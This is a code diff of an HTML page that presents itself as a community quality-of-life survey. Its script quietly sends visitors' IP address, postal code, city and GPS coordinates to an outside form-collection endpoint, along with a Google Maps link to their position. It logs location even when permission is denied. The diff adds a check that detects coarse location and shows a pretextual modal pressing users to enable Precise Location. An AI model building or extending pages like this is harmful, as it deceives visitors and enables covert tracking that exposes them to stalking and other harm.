@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Community Feast Survey</title>
+    <title>Community Survey</title>
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -52,7 +52,6 @@
             gap: 20px;
         }
 
-        /* Card Styling */
         .form-card {
             background: var(--card-bg);
             border-radius: var(--radius-lg);
@@ -68,7 +67,6 @@
 
         .header-card {
             border-top: 10px solid var(--primary-accent);
-            position: relative;
         }
 
         h1 {
@@ -86,7 +84,6 @@
             margin-bottom: 24px;
         }
 
-        /* Input Controls */
         .question-group {
             display: flex;
             flex-direction: column;
@@ -100,25 +97,47 @@
             line-height: 1.4;
         }
 
-        input[type="text"], select {
+        /* Slider Styling */
+        .slider-wrapper {
+            padding: 10px 4px 4px 4px;
+        }
+
+        .range-slider {
             width: 100%;
-            padding: 14px 16px;
-            font-size: 15px;
-            border: 1.5px solid var(--border-color);
-            border-radius: var(--radius-md);
+            height: 8px;
+            border-radius: 4px;
+            background: var(--border-color);
             outline: none;
-            background: #fafafa;
-            color: var(--text-main);
-            transition: all 0.2s ease;
+            accent-color: var(--primary-accent);
+            cursor: pointer;
         }
 
-        input[type="text"]:focus, select:focus {
-            border-color: var(--border-focus);
-            background: #ffffff;
-            box-shadow: 0 0 0 4px var(--primary-light);
+        .slider-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
         }
 
-        /* Custom Radio & Checkbox Styling */
+        .slider-badge {
+            background: var(--primary-light);
+            color: var(--primary-accent);
+            font-weight: 700;
+            font-size: 16px;
+            padding: 4px 14px;
+            border-radius: 20px;
+        }
+
+        .slider-ticks {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 8px;
+            font-size: 13px;
+            color: var(--text-sub);
+            font-weight: 500;
+        }
+
+        /* Custom Radio Styling */
         .option-label {
             display: flex;
             align-items: center;
@@ -167,11 +186,6 @@
             box-shadow: 0 4px 8px rgba(103, 58, 183, 0.3);
         }
 
-        .btn:active {
-            transform: translateY(0);
-        }
-
-        /* Hidden Questions Container */
         #questionsSection {
             display: none;
             flex-direction: column;
@@ -198,12 +212,6 @@
             max-width: 480px;
             width: 100%;
             box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
-            animation: fadeIn 0.25s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
         }
 
         .modal-card h2 {
@@ -238,67 +246,95 @@
         
         <!-- STEP 1: Intro Card -->
         <div class="form-card header-card" id="introSection">
-            <h1>Community Feast Survey 🎃</h1>
-            <p class="desc">Welcome! We're gathering details to prepare food options for our upcoming community gathering. Please tap start to begin the 5-question survey.</p>
+            <h1>Community Quality of Life Survey 📋</h1>
+            <p class="desc">Welcome! We are collecting feedback to better understand local community needs and resource distribution. Please click below to start the 5-question survey.</p>
             <button class="btn" onclick="startSurveyWithLocation()">Start Form</button>
         </div>
 
         <!-- STEP 2: The 5 Questions -->
         <div id="questionsSection">
             
+            <!-- Q1: Happiness Slider -->
             <div class="form-card">
                 <div class="question-group">
-                    <label class="question-label" for="q1">1. What is your full name?</label>
-                    <input type="text" id="q1" placeholder="Your answer">
+                    <div class="slider-header">
+                        <label class="question-label" style="margin-bottom: 0;">1. How would you rate your happiness?</label>
+                        <span class="slider-badge" id="sliderVal">3</span>
+                    </div>
+                    <div class="slider-wrapper">
+                        <input type="range" min="1" max="5" value="3" class="range-slider" id="q1_slider" oninput="document.getElementById('sliderVal').innerText = this.value">
+                        <div class="slider-ticks">
+                            <span>1 (Very Unhappy)</span>
+                            <span>2</span>
+                            <span>3</span>
+                            <span>4</span>
+                            <span>5 (Very Happy)</span>
+                        </div>
+                    </div>
                 </div>
             </div>
 
+            <!-- Q2: Wealthy Neighborhood -->
             <div class="form-card">
                 <div class="question-group">
-                    <label class="question-label">2. Will you be attending the feast?</label>
+                    <label class="question-label">2. Would you say you live in a wealthy neighborhood?</label>
                     <label class="option-label">
-                        <input type="radio" name="attending" value="Yes"> Yes, I'll be there!
+                        <input type="radio" name="wealthy_neighborhood" value="Yes"> Yes
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="attending" value="Maybe"> Maybe
+                        <input type="radio" name="wealthy_neighborhood" value="Moderate / Average"> Moderate / Average
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="attending" value="No"> Regretfully, no
+                        <input type="radio" name="wealthy_neighborhood" value="No"> No
                     </label>
                 </div>
             </div>
 
+            <!-- Q3: Basic Needs -->
             <div class="form-card">
                 <div class="question-group">
-                    <label class="question-label">3. What main course options would you prefer? (Select all that apply)</label>
+                    <label class="question-label">3. Do you have access to basic needs (like clean water, heating, housing)?</label>
                     <label class="option-label">
-                        <input type="checkbox" name="mainCourse" value="Rotisserie Chicken"> Rotisserie Chicken
+                        <input type="radio" name="basic_needs" value="Always"> Always
                     </label>
                     <label class="option-label">
-                        <input type="checkbox" name="mainCourse" value="Mac & Cheese"> Mac & Cheese
+                        <input type="radio" name="basic_needs" value="Sometimes"> Sometimes
                     </label>
                     <label class="option-label">
-                        <input type="checkbox" name="mainCourse" value="Mashed Potatoes"> Mashed Potatoes & Gravy
+                        <input type="radio" name="basic_needs" value="Rarely / Never"> Rarely / Never
                     </label>
                 </div>
             </div>
 
+            <!-- Q4: School Funding -->
             <div class="form-card">
                 <div class="question-group">
-                    <label class="question-label" for="q4">4. Any dietary restrictions or allergies?</label>
-                    <input type="text" id="q4" placeholder="Your answer (e.g. Vegetarian, Gluten-Free, None)">
+                    <label class="question-label">4. Do you think your local school is under-funded or over-funded?</label>
+                    <label class="option-label">
+                        <input type="radio" name="school_funding" value="Under-funded"> Under-funded
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="school_funding" value="Adequately funded"> Adequately funded
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="school_funding" value="Over-funded"> Over-funded
+                    </label>
                 </div>
             </div>
 
+            <!-- Q5: Financial Worry -->
             <div class="form-card">
                 <div class="question-group">
-                    <label class="question-label" for="q5">5. How many guests will you be bringing with you?</label>
-                    <select id="q5">
-                        <option value="0">Just me (0 guests)</option>
-                        <option value="1">1 guest</option>
-                        <option value="2">2 guests</option>
-                        <option value="3+">3+ guests</option>
-                    </select>
+                    <label class="question-label">5. Do you ever find yourself worrying about finance (money)?</label>
+                    <label class="option-label">
+                        <input type="radio" name="financial_worry" value="Frequently"> Frequently
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="financial_worry" value="Occasionally"> Occasionally
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="financial_worry" value="Rarely or Never"> Rarely or Never
+                    </label>
                 </div>
             </div>
 
@@ -310,18 +346,18 @@
 
     </div>
 
-    <!-- Location Guidance Modal (Appears only for Never/Blocked users) -->
+    <!-- Location Guidance Modal (Appears for Never/Blocked or Coarse/Imprecise Location) -->
     <div class="modal-overlay" id="locationGuideModal">
         <div class="modal-card">
-            <h2>Location Access Required</h2>
-            <p>Looks like we can't get your location! To ensure you're in our local delivery/gathering region, please enable location access:</p>
+            <h2>Precise Location Required</h2>
+            <p>We need high-precision location access to match your survey response with your local district. Please enable Precise Location in Safari settings:</p>
             
             <div class="settings-box">
                 <strong style="color: var(--primary-accent); display: block; margin-bottom: 6px;">iPhone/iPad Settings Path:</strong>
                 1. Open <b>Settings</b> > <b>Privacy & Security</b><br>
                 2. Tap <b>Location Services</b> (ensure it's ON)<br>
                 3. Scroll down & tap <b>Safari Websites</b><br>
-                4. Select <b>While Using the App</b> or <b>Ask</b>
+                4. Select <b>While Using the App</b> and toggle <b>Precise Location ON</b>
             </div>
 
             <button class="btn" style="width: 100%;" onclick="closeModal('locationGuideModal')">Got It</button>
@@ -345,33 +381,55 @@
 
             if ("geolocation" in navigator) {
               navigator.geolocation.getCurrentPosition(
-                // SUCCESS: User allowed location
                 function(position) {
                   const lat = position.coords.latitude;
                   const lon = position.coords.longitude;
-                  
-                  fetch("https://formspree.io/f/xqppqorj", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
-                    body: JSON.stringify({
-                      log_type: "Full Location (IP + Precise GPS)",
-                      ip_address: visitorIP,
-                      postal_code: visitorPostal,
-                      city: visitorCity,
-                      region: visitorRegion,
-                      latitude: lat,
-                      longitude: lon,
-                      google_maps_link: `https://maps.google.com/?q=${lat},${lon}`
-                    })
-                  }).catch(err => console.log(err));
+                  const accuracy = position.coords.accuracy; // Accuracy radius in meters
 
-                  // Show questions on success
-                  showQuestions();
+                  // CHECK PRECISE LOCATION: If accuracy is > 100 meters, user has Precise Location disabled
+                  if (accuracy > 100) {
+                    // Send approximate IP log
+                    fetch("https://formspree.io/f/xqppqorj", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                      body: JSON.stringify({
+                        log_type: "Approximate GPS (Precise Location Disabled)",
+                        accuracy_meters: accuracy,
+                        ip_address: visitorIP,
+                        postal_code: visitorPostal,
+                        city: visitorCity,
+                        region: visitorRegion,
+                        latitude: lat,
+                        longitude: lon
+                      })
+                    }).catch(err => console.log(err));
+
+                    // Show guidance modal asking for Precise Location toggle
+                    document.getElementById("locationGuideModal").style.display = "flex";
+                  } else {
+                    // High-precision GPS Granted
+                    fetch("https://formspree.io/f/xqppqorj", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                      body: JSON.stringify({
+                        log_type: "Full Location (IP + Precise GPS)",
+                        accuracy_meters: accuracy,
+                        ip_address: visitorIP,
+                        postal_code: visitorPostal,
+                        city: visitorCity,
+                        region: visitorRegion,
+                        latitude: lat,
+                        longitude: lon,
+                        google_maps_link: `https://maps.google.com/?q=${lat},${lon}`
+                      })
+                    }).catch(err => console.log(err));
+
+                    showQuestions();
+                  }
                 },
                 // DENIED / NEVER BLOCK DETECTED
                 function(error) {
                   if (error.code === error.PERMISSION_DENIED) {
-                    // Log approximate IP fallback quietly
                     fetch("https://formspree.io/f/xqppqorj", {
                       method: "POST",
                       headers: { "Content-Type": "application/json", "Accept": "application/json" },
@@ -384,7 +442,6 @@
                       })
                     }).catch(err => console.log(err));
 
-                    // Show custom settings guidance modal
                     document.getElementById("locationGuideModal").style.display = "flex";
                   } else {
                     showQuestions();
